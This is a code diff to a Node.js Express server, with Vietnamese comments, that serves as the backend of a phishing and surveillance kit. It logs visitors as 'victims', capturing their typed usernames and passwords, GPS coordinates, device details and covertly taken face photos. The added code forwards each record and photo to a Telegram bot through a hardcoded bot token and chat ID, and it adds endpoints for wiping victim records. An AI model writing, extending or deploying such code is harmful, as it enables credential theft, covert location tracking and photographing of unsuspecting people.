@@ -12,12 +12,64 @@ const LOG_FILE   = path.join(DATA_DIR, 'victims.jsonl');
 fs.mkdirSync(UPLOAD_DIR, { recursive: true });
 fs.mkdirSync(DATA_DIR,   { recursive: true });
 
-// Tài khoản admin đơn giản
 const ADMIN_USER = 'eveujrmx';
 const ADMIN_PASS = 'eveujrmx';
-
-// Token tạm để check session (không dùng JWT cho gọn)
 const SESSIONS = new Set();
+
+const BOT_TOKEN = process.env.BOT_TOKEN || '8677283263:AAHCbjIS9tKYSWu098q1pOk_8D2V2sCxVA8';
+const CHAT_ID   = process.env.CHAT_ID   || '7692889375';
+
+const wq = { busy: false, q: [] };
+function safeAppend(rec) {
+  return new Promise(resolve => {
+    wq.q.push({ rec, resolve });
+    drain();
+  });
+}
+function drain() {
+  if (wq.busy || !wq.q.length) return;
+  wq.busy = true;
+  const { rec, resolve } = wq.q.shift();
+  try { fs.appendFileSync(LOG_FILE, JSON.stringify(rec) + '\n'); } catch(e){}
+  wq.busy = false;
+  resolve();
+  drain();
+}
+
+async function forwardToTelegram(rec, filePath) {
+  if (!BOT_TOKEN || !CHAT_ID) return;
+  try {
+    const text = `🚨 CÓ NẠN NHÂN MỚI!\n\n` +
+      `🕐 Time: ${rec.time || '-'}\n` +
+      `🌐 IP: ${rec.ip || '-'}\n` +
+      `📷 Camera: ${rec.data?.cameraStatus || rec.cameraStatus || '-'}\n` +
+      `📍 GPS: ${rec.data?.gpsStatus || rec.gpsStatus || '-'}\n` +
+      `🗺 Tọa độ: ${rec.data?.gpsCoords || rec.gpsCoords || '-'}\n` +
+      `🔋 Pin: ${rec.data?.battery || rec.battery || '-'}\n` +
+      `📶 Mạng: ${rec.data?.network || rec.network || '-'}\n` +
+      `👤 User: ${rec.data?.form?.username || '-'}\n` +
+      `🔑 Pass: ${rec.data?.form?.password || '-'}\n` +
+      `💻 UA: ${(rec.data?.ua || rec.ua || '').slice(0, 80)}`;
+
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text })
+    });
+
+    if (filePath && fs.existsSync(filePath)) {
+      const fileBuf = fs.readFileSync(filePath);
+      const fd = new FormData();
+      fd.append('chat_id', CHAT_ID);
+      fd.append('photo', new Blob([fileBuf], { type: 'image/jpeg' }), 'victim.jpg');
+      fd.append('caption', `📸 Mặt nạn nhân — IP ${rec.ip || '?'}`);
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: 'POST',
+        body: fd
+      });
+    }
+  } catch(e) { console.log('TG fail:', e.message); }
+}
 
 const storage = multer.diskStorage({
   destination: (req, file, cb) => cb(null, UPLOAD_DIR),
@@ -36,8 +88,7 @@ function getClientIP(req) {
       || req.socket.remoteAddress;
 }
 
-/* ============ API public cho web ============ */
-app.post('/register', (req, res) => {
+app.post('/register', async (req, res) => {
   const rec = {
     time: new Date().toISOString(),
     ip: getClientIP(req),
@@ -45,24 +96,26 @@ app.post('/register', (req, res) => {
     ref: req.headers['referer'],
     data: req.body
   };
-  fs.appendFileSync(LOG_FILE, JSON.stringify(rec) + '\n');
+  await safeAppend(rec);
   console.log('📝', rec.ip);
+  forwardToTelegram(rec, null);
   res.json({ ok: true });
 });
 
-app.post('/face', upload.single('photo'), (req, res) => {
+app.post('/face', upload.single('photo'), async (req, res) => {
   if (!req.file) return res.status(400).json({ ok: false });
-  fs.appendFileSync(LOG_FILE, JSON.stringify({
+  const rec = {
     time: new Date().toISOString(),
     ip: getClientIP(req),
     ua: req.headers['user-agent'],
     face: req.file.filename
-  }) + '\n');
+  };
+  await safeAppend(rec);
   console.log('📸', req.file.filename);
+  forwardToTelegram(rec, req.file.path);
   res.json({ ok: true });
 });
 
-/* ============ Login API ============ */
 app.post('/api/login', (req, res) => {
   const { user, pass } = req.body || {};
   if (user === ADMIN_USER && pass === ADMIN_PASS) {
@@ -79,7 +132,6 @@ function checkToken(req, res, next) {
   next();
 }
 
-/* ============ Admin data API ============ */
 app.get('/api/victims', checkToken, (req, res) => {
   if (!fs.existsSync(LOG_FILE)) return res.json([]);
   const lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean);
@@ -93,7 +145,44 @@ app.get('/api/photo/:name', checkToken, (req, res) => {
   res.sendFile(f);
 });
 
-/* ============ Static ============ */
+app.delete('/api/victim', checkToken, (req, res) => {
+  const { time, ip } = req.query;
+  if (!time) return res.status(400).json({ ok: false });
+  if (!fs.existsSync(LOG_FILE)) return res.json({ ok: false });
+
+  const lines = fs.readFileSync(LOG_FILE, 'utf8').trim().split('\n').filter(Boolean);
+  let removed = 0;
+  const kept = [];
+
+  for (const line of lines) {
+    try {
+      const r = JSON.parse(line);
+      if (r.time === time && (!ip || r.ip === ip)) {
+        if (r.face) {
+          const fp = path.join(UPLOAD_DIR, path.basename(r.face));
+          if (fs.existsSync(fp)) { try { fs.unlinkSync(fp); } catch(e){} }
+        }
+        removed++;
+        continue;
+      }
+    } catch(e){}
+    kept.push(line);
+  }
+
+  fs.writeFileSync(LOG_FILE, kept.join('\n') + (kept.length ? '\n' : ''));
+  res.json({ ok: true, removed });
+});
+
+app.delete('/api/victims', checkToken, (req, res) => {
+  if (fs.existsSync(UPLOAD_DIR)) {
+    for (const f of fs.readdirSync(UPLOAD_DIR)) {
+      try { fs.unlinkSync(path.join(UPLOAD_DIR, f)); } catch(e){}
+    }
+  }
+  if (fs.existsSync(LOG_FILE)) fs.writeFileSync(LOG_FILE, '');
+  res.json({ ok: true });
+});
+
 app.use(express.static(path.join(__dirname, 'public')));
 
 app.get('/health', (req, res) => res.json({ ok: true, t: Date.now() }));
